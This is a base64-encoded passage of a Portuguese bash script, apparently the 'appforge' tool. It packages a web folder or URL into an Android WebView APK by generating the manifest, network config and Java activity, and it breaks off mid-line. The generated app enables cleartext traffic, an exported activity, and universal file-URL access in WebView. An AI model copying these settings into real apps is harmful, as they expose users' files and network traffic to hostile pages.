ICAgYXBwZm9yZ2UgYXBrMndlYiA8YXJxdWl2by5hcGs+IFtkaXJfc2FpZGFdXG4nCiAgcHJpbnRmICcgICAgYXBwZm9yZ2UgY2hlY2sgLyBhcHBmb3JnZSBjaGVjayA8ZGlyPlxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1PcGNvZXMgZGUgYnVpbGQ6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIC0tbmFtZSAiTm9tZSIgICAgICAgICAgTm9tZSBleGliaWRvXG4nCiAgcHJpbnRmICcgICAgLS1wa2duYW1lIGNvbS5wa2cuaWQgICBQYWNrYWdlIElEXG4nCiAgcHJpbnRmICcgICAgLS1pY29uIC9wYXRoL2ljb24gICAgICBJY29uZSAocHJpb3JpZGFkZSBtYXhpbWEpXG4nCiAgcHJpbnRmICcgICAgLS1pY29uLXNlYXJjaCA8dGVybW8+ICBCdXNjYSBpY29uZSBpbnRlcmF0aXZhbWVudGVcbicKICBwcmludGYgJyAgICAtLWljb24tYXV0byAgICAgICAgICAgIERlc2NvYnJlIGZhdmljb24vbG9nbyBkbyBzaXRlXG4nCiAgcHJpbnRmICcgICAgLS1vdXQgL3BhdGgvYXBwLmFwayAgICBTYWlkYVxuJwogIHByaW50ZiAnICAgIC0tcGVybSBjYW0sbWljLC4uLiAgICAgUGVybWlzc29lc1xuJwogIHByaW50ZiAnICAgIC0tdmVyc2lvbiAiMS4wIiAgICAgICAgVmVyc2lvbiBuYW1lXG4nCiAgcHJpbnRmICcgICAgLS12ZXJzaW9uY29kZSBOICAgICAgICBWZXJzaW9uIGNvZGVcbicKICBwcmludGYgJyAgICAtLW1pbi1zZGsgTiAgICAgICAgICAgIE1pbiBTREsgKHBhZHJhbyAyMSlcbicKICBwcmludGYgJyAgICAtLXRhcmdldC1zZGsgTiAgICAgICAgIFRhcmdldCBTREsgKHBhZHJhbyAzMylcbicKICBwcmludGYgJyAgICAtLW9yaWVudGF0aW9uIHBvcnRyYWl0fGxhbmRzY2FwZXxhdXRvXG4nCiAgcHJpbnRmICcgICAgLS1mdWxsc2NyZWVuICAgICAgICAgICBFc2NvbmRlIHN0YXR1cyBiYXJcbicKICBwcmludGYgJyAgICAtLXRoZW1lIGRhcmt8bGlnaHR8dHJhbnNwYXJlbnRcbicKICBwcmludGYgJyAgICAtLXVybCBodHRwczovLy4uLiAgICAgIENhcnJlZ2EgVVJMIHJlbW90YVxuJwogIHByaW50ZiAnICAgIC0tbm8taW50ZXJuZXQgICAgICAgICAgU2VtIElOVEVSTkVUIGF1dG9tYXRpY2FcblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtUHJpb3JpZGFkZSBkZSBpY29uZTpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgMS4gLS1pY29uICAyLiAtLWljb24tYXV0byAgMy4gLS1pY29uLXNlYXJjaCAgNC4gcGxhY2Vob2xkZXJcblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtSWNvbmVzIHN0YW5kYWxvbmU6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG1hZiBpY29uIHNlYXJjaCA8dGVybW8+ICAvICBhZiBpY29uIGNsZWFuIFstLWZvcmNlXVwwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtRXhlbXBsb3M6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG1hcHBmb3JnZSBidWlsZCAuL2FwcC8gLS1uYW1lICJBcHAiIC0tcGVybSBpbnRlcm5ldCxjYW1lcmFcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGJ1aWxkIC0tdXJsIGh0dHBzOi8vZ2l0aHViLmNvbSAtLW5hbWUgIkdpdEh1YiIgLS1pY29uLXNlYXJjaCBnaXRodWJcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGJ1aWxkIC0tdXJsIGh0dHBzOi8veW91dHViZS5jb20gLS1pY29uLWF1dG9cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbWFwcGZvcmdlIGFwazJ3ZWIgTWV1QXBwLmFwa1wwMzNbMG1cblxuJwp9Cl9jbWRfYnVpbGQoKSB7CiAgbG9jYWwgU1JDX0RJUj0nJyBMT0FEX1VSTD0nJyBBUFBfTkFNRT0nJyBQS0dfTkFNRT0nJyBJQ09OX1NSQz0nJwogIGxvY2FsIElDT05fU0VBUkNIX1RFUk09JycgSUNPTl9BVVRPPTAKICBsb2NhbCBPVVRfQVBLPScnIFBFUk1TPScnIFZFUlNJT05fTkFNRT0nMS4wLjAnIFZFUlNJT05fQ09ERT0xCiAgbG9jYWwgTUlOX1NESz0yMSBUQVJHRVRfU0RLPTMzIE9SSUVOVEFUSU9OPSd1bnNwZWNpZmllZCcKICBsb2NhbCBGVUxMU0NSRUVOPTAgVEhFTUU9J2xpZ2h0JyBOT19JTlRFUk5FVD0wCiAgd2hpbGUgWyAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluCiAgICAgIC0tdXJsKSAgICAgICAgICBMT0FEX1VSTD0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tbmFtZSkgICAgICAgICBBUFBfTkFNRT0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGtnbmFtZSkgICAgICBQS0dfTkFNRT0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbikgICAgICAgICBJQ09OX1NSQz0iJDIiOyAgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbi1zZWFyY2gpICBJQ09OX1NFQVJDSF9URVJNPSIkMiI7ICBzaGlmdCAyIDs7CiAgICAgIC0taWNvbi1hdXRvKSAgICBJQ09OX0FVVE89MTsgICAgICAgICAgICBzaGlmdCA7OwogICAgICAtLW91dCkgICAgICAgICAgT1VUX0FQSz0iJDIiOyAgICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXBlcm18LS1wZXJtcykgUEVSTVM9IiRQRVJNUywkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb24pICAgICAgVkVSU0lPTl9OQU1FPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb25jb2RlKSAgVkVSU0lPTl9DT0RFPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW1pbi1zZGspICAgICAgTUlOX1NESz0iJDIiOyAgICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXRhcmdldC1zZGspICAgVEFSR0VUX1NESz0iJDIiOyAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLW9yaWVudGF0aW9uKSAgT1JJRU5UQVRJT049IiQyIjsgICAgICAgc2hpZnQgMiA7OwogICAgICAtLWZ1bGxzY3JlZW4pICAgRlVMTFNDUkVFTj0xOyAgICAgICAgICAgc2hpZnQgOzsKICAgICAgLS10aGVtZSkgICAgICAgIFRIRU1FPSIkMiI7ICAgICAgICAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1uby1pbnRlcm5ldCkgIE5PX0lOVEVSTkVUPTE7ICAgICAgICAgIHNoaWZ0IDs7CiAgICAgIC0tKikgICAgICAgICAgICBfd2FybiAiT3BjYW8gZGVzY29uaGVjaWRhOiAkMSI7IHNoaWZ0IDs7CiAgICAgICopIFsgLXogIiRTUkNfRElSIiBdICYmIFsgLXogIiRMT0FEX1VSTCIgXSAmJiBTUkNfRElSPSIkMSI7IHNoaWZ0IDs7CiAgICBlc2FjCiAgZG9uZQogICMgTm9ybWFsaXphIFVSTAogIGlmIFsgLW4gIiRMT0FEX1VSTCIgXTsgdGhlbgogICAgY2FzZSAiJExPQURfVVJMIiBpbiBodHRwOi8vKnxodHRwczovLyopIDo7OyAqKSBMT0FEX1VSTD0iaHR0cHM6Ly8kTE9BRF9VUkwiOzsgZXNhYwogIGZpCiAgWyAtZiAiJFcyQV9KQVIiIF0gfHwgX2VyciAnYW5kcm9pZC5qYXIgYXVzZW50ZS4gRXhlY3V0ZTogeHBtIGluc3RhbGwgYXBwZm9yZ2UnCiAgaWYgWyAteiAiJExPQURfVVJMIiBdOyB0aGVuCiAgICBbIC16ICIkU1JDX0RJUiIgXSAmJiB7IF9jbWRfaGVscDsgZXhpdCAxOyB9CiAgICBbIC1kICIkU1JDX0RJUiIgXSB8fCBfZXJyICJEaXJldG9yaW8gbmFvIGVuY29udHJhZG86ICRTUkNfRElSIgogICAgWyAtZiAiJFNSQ19ESVIvaW5kZXguaHRtbCIgXSB8fCBfd2FybiAnaW5kZXguaHRtbCBuYW8gZW5jb250cmFkbycKICBmaQogIGxvY2FsIERJUl9CQVNFOyBESVJfQkFTRT0kKGJhc2VuYW1lICIke1NSQ19ESVIlL30iKQogIFsgLXogIiRBUFBfTkFNRSIgXSAmJiBBUFBfTkFNRT0iJHtESVJfQkFTRTotV2ViQXBwfSIKICBsb2NhbCBQS0dfU0FGRTsgUEtHX1NBRkU9JChwcmludGYgJyVzJyAiJEFQUF9OQU1FIiB8IHRyICdBLVonICdhLXonIHwgc2VkICdzL1teYS16MC05XS9fL2c7cy9fXyovXy9nJykKICBbIC16ICIkUEtHX05BTUUiIF0gJiYgUEtHX05BTUU9ImNvbS5lbGxpb3Rvcy53ZWJhcGsuJHtQS0dfU0FGRX0iCiAgWyAteiAiJE9VVF9BUEsiICBdICYmIE9VVF9BUEs9IiR7QVBQX05BTUUvLyAvX30uYXBrIgogIFsgIiROT19JTlRFUk5FVCIgLWVxIDAgXSAmJiBQRVJNUz0iaW50ZXJuZXQsJFBFUk1TIgogIF9oZWFkICdhcHBmb3JnZSBidWlsZCcKICBfaW5mbyAiQXBwICAgICA6ICRBUFBfTkFNRSIKICBfaW5mbyAiUGFja2FnZSA6ICRQS0dfTkFNRSIKICBfaW5mbyAiU2FpZGEgICA6ICRPVVRfQVBLIgogIFsgLW4gIiRMT0FEX1VSTCIgXSAmJiBfaW5mbyAiVVJMICAgICA6ICRMT0FEX1VSTCIKICBbIC1uICIkU1JDX0RJUiIgIF0gJiYgX2luZm8gIkZvbnRlICAgOiAkU1JDX0RJUiIKICAjIFByaW9yaWRhZGUgZGUgw61jb25lCiAgbG9jYWwgX1RNUF9SRVNVTFQ7IF9UTVBfUkVTVUxUPSQobWt0ZW1wKQogIGlmIFsgLW4gIiRJQ09OX1NSQyIgXSAmJiB7IFsgLW4gIiRJQ09OX1NFQVJDSF9URVJNIiBdIHx8IFsgIiRJQ09OX0FVVE8iIC1lcSAxIF07IH07IHRoZW4KICAgIF93YXJuICItLWljb24gdGVtIHByaW9yaWRhZGUg4oCUIGlnbm9yYW5kbyAtLWljb24tc2VhcmNoLy0taWNvbi1hdXRvIgogICAgSUNPTl9TRUFSQ0hfVEVSTT0iIjsgSUNPTl9BVVRPPTAKICBmaQogIGlmIFsgIiRJQ09OX0FVVE8iIC1lcSAxIF0gJiYgWyAteiAiJElDT05fU1JDIiBdOyB0aGVuCiAgICBsb2NhbCBfQVVUT19UTVA7IF9BVVRPX1RNUD0kKF9pY29uX21rdGVtcF9kaXIpCiAgICBpZiBbIC1uICIkX0FVVE9fVE1QIiBdOyB0aGVuCiAgICAgIGxvY2FsIF9BVVRPX1I7IF9BVVRPX1I9JChfaWNvbl9hdXRvX2Rpc2NvdmVyICIke0xPQURfVVJMOi1odHRwczovL2V4YW1wbGUuY29tfSIgIiRfQVVUT19UTVAiKQogICAgICBpZiBwcmludGYgJyVzJyAiJF9BVVRPX1IiIHwgZ3JlcCAtcSAnXm9rOic7IHRoZW4KICAgICAgICBsb2NhbCBfQVVUT19SQVc7IF9BVVRPX1JBVz0kKHByaW50ZiAnJXMnICIkX0FVVE9fUiIgfCBncmVwICdeb2s6JyB8IGhlYWQgLTEgfCBjdXQgLWQ6IC1mMi0pCiAgICAgICAgbG9jYWwgX0FVVE9fRklOQUw9IiRfQVVUT19UTVAvc2VsZWN0ZWQucG5nIgogICAgICAgIGlmIF9pY29uX3RvX3BuZyAiJF9BVVRPX1JBVyIgIiRfQVVUT19GSU5BTCIgMTkyOyB0aGVuCiAgICAgICAgICBJQ09OX1NSQz0iJF9BVVRPX0ZJTkFMIjsgX29rICJJY29uZSBhdXRvbWF0aWNvOiAkSUNPTl9TUkMiCiAgICAgICAgZmkKICAgICAgZWxzZQogICAgICAgIF93YXJuICJJY29uZSBhdXRvbWF0aWNvIG5hbyBlbmNvbnRyYWRvIgogICAgICBmaQogICAgZmkKICBmaQogIGlmIFsgLW4gIiRJQ09OX1NFQVJDSF9URVJNIiBdICYmIFsgLXogIiRJQ09OX1NSQyIgXTsgdGhlbgogICAgaWYgX2ljb25fc2VhcmNoX2FuZF9zZWxlY3QgIiRJQ09OX1NFQVJDSF9URVJNIiAiJF9UTVBfUkVTVUxUIjsgdGhlbgogICAgICBJQ09OX1NSQz0kKGNhdCAiJF9UTVBfUkVTVUxUIiAyPi9kZXYvbnVsbCkKICAgICAgWyAtbiAiJElDT05fU1JDIiBdICYmIF9vayAiSWNvbmUgc2VsZWNpb25hZG86ICRJQ09OX1NSQyIKICAgIGVsc2UKICAgICAgX3dhcm4gIkJ1c2NhIGNhbmNlbGFkYSDigJQgc2VtIGljb25lIHBlcnNvbmFsaXphZG8iCiAgICBmaQogIGZpCiAgcm0gLWYgIiRfVE1QX1JFU1VMVCIKICBsb2NhbCBCVUlMRAogIEJVSUxEPSQobWt0ZW1wIC1kIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvdG1wL2FwcGZvcmdlLlhYWFhYWCAyPi9kZXYvbnVsbCkgXAogICAgfHwgQlVJTEQ9JChta3RlbXAgLWQgIiRIT01FLy54cG0vYXBwZm9yZ2UvYnVpbGQuWFhYWFhYIikKICB0cmFwICdybSAtcmYgIiRCVUlMRCInIEVYSVQKICBsb2NhbCBQS0dfUEFUSDsgUEtHX1BBVEg9JChwcmludGYgJyVzJyAiJFBLR19OQU1FIiB8IHRyICcuJyAnLycpCiAgbWtkaXIgLXAgIiRCVUlMRC9zcmMvJFBLR19QQVRIIiAiJEJVSUxEL2NsYXNzZXMiICIkQlVJTEQvcmVzX2NvbXBpbGVkIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvdmFsdWVzIiAiJEJVSUxEL3Jlcy94bWwiICIkQlVJTEQvYXNzZXRzL3d3dyIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLW1kcGkiICAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4aGRwaSIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4eGhkcGkiCiAgX2luZm8gJ1ByZXBhcmFuZG8gaWNvbmUuLi4nCiAgaWYgWyAtbiAiJElDT05fU1JDIiBdICYmIFsgLWYgIiRJQ09OX1NSQyIgXTsgdGhlbgogICAgX2RpbSAiRm9udGU6ICRJQ09OX1NSQyIKICAgIGxvY2FsIF9JQ09OX1BORz0iJElDT05fU1JDIgogICAgbG9jYWwgX0ZNVF9TUkM7IF9GTVRfU1JDPSQoX2ljb25fZGV0ZWN0X2Zvcm1hdCAiJElDT05fU1JDIikKICAgIGlmIFsgIiRfRk1UX1NSQyIgIT0gInBuZyIgXTsgdGhlbgogICAgICBsb2NhbCBfVE1QX1BORzsgX1RNUF9QTkc9JChta3RlbXAgL3RtcC9hZl9pY29uX1hYWFhYWC5wbmcpCiAgICAgIF9pY29uX3RvX3BuZyAiJElDT05fU1JDIiAiJF9UTVBfUE5HIiAxOTIgJiYgX0lDT05fUE5HPSIkX1RNUF9QTkciCiAgICBmaQogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1tZHBpL2ljb24ucG5nIiAgICA0OAogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14aGRwaS9pY29uLnBuZyIgICA5NgogICAgX3Jlc2l6ZV9pY29uICIkX0lDT05fUE5HIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eGhkcGkvaWNvbi5wbmciICAxNDQKICAgIF9yZXNpemVfaWNvbiAiJF9JQ09OX1BORyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgICBfb2sgIkljb25lIHJlZGltZW5zaW9uYWRvIChtZHBpL2hkcGkveGhkcGkveHhoZHBpL3h4eGhkcGkpIgogIGVsc2UKICAgIFsgLW4gIiRJQ09OX1NSQyIgXSAmJiBfd2FybiAiSWNvbmUgbmFvIGVuY29udHJhZG86ICRJQ09OX1NSQyIKICAgIGZvciBkIGluIG1kcGkgaGRwaSB4aGRwaSB4eGhkcGkgeHh4aGRwaTsgZG8gX2dlbl9pY29uICIkQlVJTEQvcmVzL2RyYXdhYmxlLSR7ZH0vaWNvbi5wbmciOyBkb25lCiAgZmkKICBbIC1uICIkU1JDX0RJUiIgXSAmJiBbIC1kICIkU1JDX0RJUiIgXSAmJiB7CiAgICBjcCAtciAiJFNSQ19ESVIiLy4gIiRCVUlMRC9hc3NldHMvd3d3LyIKICAgIGxvY2FsIF9udCBfbmggX25jIF9uagogICAgX250PSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgfCB3YyAtbCkKICAgIF9uaD0kKGZpbmQgIiRCVUlMRC9hc3NldHMvd3d3IiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHdjIC1sKQogICAgX25jPSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmNzcyIgIHwgd2MgLWwpCiAgICBfbmo9JChmaW5kICIkQlVJTEQvYXNzZXRzL3d3dyIgLXR5cGUgZiAtaW5hbWUgIiouanMiICAgfCB3YyAtbCkKICAgIF9pbmZvICJBc3NldHM6ICRfbnQgYXJxdWl2b3MgKCRfbmggSFRNTCwgJF9uYyBDU1MsICRfbmogSlMpIgogICAgaWYgWyAhIC1mICIkQlVJTEQvYXNzZXRzL3d3dy9pbmRleC5odG1sIiBdOyB0aGVuCiAgICAgIGxvY2FsIF9maDsgX2ZoPSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmh0bWwiIHwgaGVhZCAtMSkKICAgICAgWyAtbiAiJF9maCIgXSAmJiBKQVZBX0xPQURfRkFMTEJBQ0s9ImZpbGU6Ly8vYW5kcm9pZF9hc3NldC93d3cvJChiYXNlbmFtZSAiJF9maCIpIiBcCiAgICAgICAgICAgICAgICAgICAgfHwgSkFWQV9MT0FEX0ZBTExCQUNLPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnCiAgICBmaQogIH0KICBleHBvcnQgVzJBX0FQUD0iJEFQUF9OQU1FIiBXMkFfQlVJTEQ9IiRCVUlMRCIKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmFwcD1vcy5lbnZpcm9uLmdldCgnVzJBX0FQUCcsJ0FwcCcpOyBvdXQ9b3MuZW52aXJvbi5nZXQoJ1cyQV9CVUlMRCcsJycpKycvcmVzL3ZhbHVlcy9zdHJpbmdzLnhtbCcKYXBwPWFwcC5yZXBsYWNlKCcmJywnJmFtcDsnKS5yZXBsYWNlKCc8JywnJmx0OycpLnJlcGxhY2UoJz4nLCcmZ3Q7JykucmVwbGFjZSgnXCInLCcmcXVvdDsnKQpvcGVuKG91dCwndycpLndyaXRlKCc8P3htbCB2ZXJzaW9uPVwiMS4wXCIgZW5jb2Rpbmc9XCJ1dGYtOFwiPz5cbjxyZXNvdXJjZXM+XG4gICAgPHN0cmluZyBuYW1lPVwiYXBwX25hbWVcIj4nK2FwcCsnPC9zdHJpbmc+XG48L3Jlc291cmNlcz5cbicpCiIKICBjYXQgPiAiJEJVSUxEL3Jlcy94bWwvbmV0d29ya19zZWN1cml0eV9jb25maWcueG1sIiA8PCAnTlNFT0YnCjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+CjxuZXR3b3JrLXNlY3VyaXR5LWNvbmZpZz4KICAgIDxiYXNlLWNvbmZpZyBjbGVhcnRleHRUcmFmZmljUGVybWl0dGVkPSJ0cnVlIj4KICAgICAgICA8dHJ1c3QtYW5jaG9ycz48Y2VydGlmaWNhdGVzIHNyYz0ic3lzdGVtIi8+PC90cnVzdC1hbmNob3JzPgogICAgPC9iYXNlLWNvbmZpZz4KPC9uZXR3b3JrLXNlY3VyaXR5LWNvbmZpZz4KTlNFT0YKICBsb2NhbCBQRVJNU19MSVNUCiAgUEVSTVNfTElTVD0kKHByaW50ZiAnJXMnICIkUEVSTVMiIHwgdHIgJywnICdcbicgfCB3aGlsZSByZWFkIC1yIHA7IGRvIF9wZXJtX3Jlc29sdmUgIiRwIjsgZG9uZSB8IHNvcnQgLXUgfCB0ciAnXG4nICd8JykKICBsb2NhbCBPUklFTlRfQU5EUk9JRD0ndW5zcGVjaWZpZWQnCiAgY2FzZSAiJE9SSUVOVEFUSU9OIiBpbiBwb3J0cmFpdCkgT1JJRU5UX0FORFJPSUQ9J3BvcnRyYWl0Jzs7IGxhbmRzY2FwZSkgT1JJRU5UX0FORFJPSUQ9J2xhbmRzY2FwZSc7OyBhdXRvKSBPUklFTlRfQU5EUk9JRD0nZnVsbFNlbnNvcic7OyBlc2FjCiAgZXhwb3J0IFcyQV9QS0c9IiRQS0dfTkFNRSIgVzJBX1ZDPSIkVkVSU0lPTl9DT0RFIiBXMkFfVk49IiRWRVJTSU9OX05BTUUiIFwKICAgICAgICAgVzJBX01JTlNESz0iJE1JTl9TREsiIFcyQV9UR1RTREs9IiRUQVJHRVRfU0RLIiBcCiAgICAgICAgIFcyQV9PUklFTlQ9IiRPUklFTlRfQU5EUk9JRCIgVzJBX1BFUk1TPSIkUEVSTVNfTElTVCIKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmJ1aWxkPW9zLmVudmlyb25bJ1cyQV9CVUlMRCddO3BrZz1vcy5lbnZpcm9uWydXMkFfUEtHJ107dmM9b3MuZW52aXJvblsnVzJBX1ZDJ10Kdm49b3MuZW52aXJvblsnVzJBX1ZOJ107bWluc2RrPW9zLmVudmlyb25bJ1cyQV9NSU5TREsnXTt0Z3RzZGs9b3MuZW52aXJvblsnVzJBX1RHVFNESyddCm9yaWVudD1vcy5lbnZpcm9uWydXMkFfT1JJRU5UJ107cGVybXM9W3AgZm9yIHAgaW4gb3MuZW52aXJvblsnVzJBX1BFUk1TJ10uc3BsaXQoJ3wnKSBpZiBwXQpweG1sPScnLmpvaW4oJyAgICA8dXNlcy1wZXJtaXNzaW9uIGFuZHJvaWQ6bmFtZT1cIicrcCsnXCIvPlxuJyBmb3IgcCBpbiBwZXJtcykKeG1sPSgnPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwidXRmLThcIj8+XG48bWFuaWZlc3QgeG1sbnM6YW5kcm9pZD1cImh0dHA6Ly9zY2hlbWFzLmFuZHJvaWQuY29tL2Fway9yZXMvYW5kcm9pZFwiXG4nCiAgICAgJyAgICBwYWNrYWdlPVwiJytwa2crJ1wiIGFuZHJvaWQ6dmVyc2lvbkNvZGU9XCInK3ZjKydcIiBhbmRyb2lkOnZlcnNpb25OYW1lPVwiJyt2bisnXCI+XG4nCiAgICAgJyAgICA8dXNlcy1zZGsgYW5kcm9pZDptaW5TZGtWZXJzaW9uPVwiJyttaW5zZGsrJ1wiIGFuZHJvaWQ6dGFyZ2V0U2RrVmVyc2lvbj1cIicrdGd0c2RrKydcIi8+XG4nCiAgICAgK3B4bWwrCiAgICAgJyAgICA8YXBwbGljYXRpb24gYW5kcm9pZDpsYWJlbD1cIkBzdHJpbmcvYXBwX25hbWVcIiBhbmRyb2lkOmljb249XCJAZHJhd2FibGUvaWNvblwiXG4nCiAgICAgJyAgICAgICAgYW5kcm9pZDpoYXJkd2FyZUFjY2VsZXJhdGVkPVwidHJ1ZVwiIGFuZHJvaWQ6dXNlc0NsZWFydGV4dFRyYWZmaWM9XCJ0cnVlXCJcbicKICAgICAnICAgICAgICBhbmRyb2lkOm5ldHdvcmtTZWN1cml0eUNvbmZpZz1cIkB4bWwvbmV0d29ya19zZWN1cml0eV9jb25maWdcIj5cbicKICAgICAnICAgICAgICA8YWN0aXZpdHkgYW5kcm9pZDpuYW1lPVwiLldlYkFjdGl2aXR5XCIgYW5kcm9pZDpleHBvcnRlZD1cInRydWVcIlxuJwogICAgICcgICAgICAgICAgICBhbmRyb2lkOnNjcmVlbk9yaWVudGF0aW9uPVwiJytvcmllbnQrJ1wiXG4nCiAgICAgJyAgICAgICAgICAgIGFuZHJvaWQ6Y29uZmlnQ2hhbmdlcz1cIm9yaWVudGF0aW9ufHNjcmVlblNpemV8a2V5Ym9hcmRIaWRkZW5cIj5cbicKICAgICAnICAgICAgICAgICAgPGludGVudC1maWx0ZXI+XG4nCiAgICAgJyAgICAgICAgICAgICAgICA8YWN0aW9uIGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmFjdGlvbi5NQUlOXCIvPlxuJwogICAgICcgICAgICAgICAgICAgICAgPGNhdGVnb3J5IGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmNhdGVnb3J5LkxBVU5DSEVSXCIvPlxuJwogICAgICcgICAgICAgICAgICA8L2ludGVudC1maWx0ZXI+XG4nCiAgICAgJyAgICAgICAgPC9hY3Rpdml0eT5cbiAgICA8L2FwcGxpY2F0aW9uPlxuPC9tYW5pZmVzdD5cbicpCm9wZW4oYnVpbGQrJy9BbmRyb2lkTWFuaWZlc3QueG1sJywndycpLndyaXRlKHhtbCkKIgogIGxvY2FsIEpBVkFfRlMgSkFWQV9USEVNRSBKQVZBX0xPQUQKICBbICIkRlVMTFNDUkVFTiIgLWVxIDEgXSBcCiAgICAmJiBKQVZBX0ZTPScgICAgICAgIHJlcXVlc3RXaW5kb3dGZWF0dXJlKGFuZHJvaWQudmlldy5XaW5kb3cuRkVBVFVSRV9OT19USVRMRSk7IGdldFdpbmRvdygpLnNldEZsYWdzKGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4sIGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4pOycgXAogICAgfHwgSkFWQV9GUz0nICAgICAgICAvLyBzdGF0dXMgYmFyIG5vcm1hbCcKICBjYXNlICIkVEhFTUUiIGluIGRhcmspIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHhGRjAwMDAwMCk7Jzs7IHRyYW5zcGFyZW50KSBKQVZBX1RIRU1FPScgICAgICAgIHcuc2V0QmFja2dyb3VuZENvbG9yKDB4MDAwMDAwMDApOyc7OyAqKSBKQVZBX1RIRU1FPScgICAgICAgIC8vIGZ1bmRvIHBhZHJhbyc7OyBlc2FjCiAgaWYgWyAtbiAiJExPQURfVVJMIiBdOyB0aGVuIEpBVkFfTE9BRD0iJExPQURfVVJMIgogIGVsaWYgWyAtbiAiJHtKQVZBX0xPQURfRkFMTEJBQ0s6LX0iIF07IHRoZW4gSkFWQV9MT0FEPSIkSkFWQV9MT0FEX0ZBTExCQUNLIgogIGVsc2UgSkFWQV9MT0FEPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnOyBmaQogIGNhdCA+ICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiA8PCBKQVZBRU9GCnBhY2thZ2UgJFBLR19OQU1FOwppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lkLm9zLkJ1bmRsZTsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlNldHRpbmdzOwppbXBvcnQgYW5kcm9pZC53ZWJraXQuV2ViVmlldzsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlZpZXdDbGllbnQ7CnB1YmxpYyBjbGFzcyBXZWJBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsKICAgIHByaXZhdGUgV2ViVmlldyB3OwogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lkIG9uQ3JlYXRlKEJ1bmRsZSBiKSB7CiAgICAgICAgc3VwZXIub25DcmVhdGUoYik7CiRKQVZBX0ZTCiAgICAgICAgdyA9IG5ldyBXZWJWaWV3KHRoaXMpOwokSkFWQV9USEVNRQogICAgICAgIHNldENvbnRlbnRWaWV3KHcpOwogICAgICAgIFdlYlNldHRpbmdzIHMgPSB3LmdldFNldHRpbmdzKCk7CiAgICAgICAgcy5zZXRKYXZhU2NyaXB0RW5hYmxlZCh0cnVlKTsgcy5zZXREb21TdG9yYWdlRW5hYmxlZCh0cnVlKTsKICAgICAgICBzLnNldEFsbG93RmlsZUFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsgcy5zZXRBbGxvd1VuaXZlcnNhbEFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsKICAgICAgICBzLnNldEJ1aW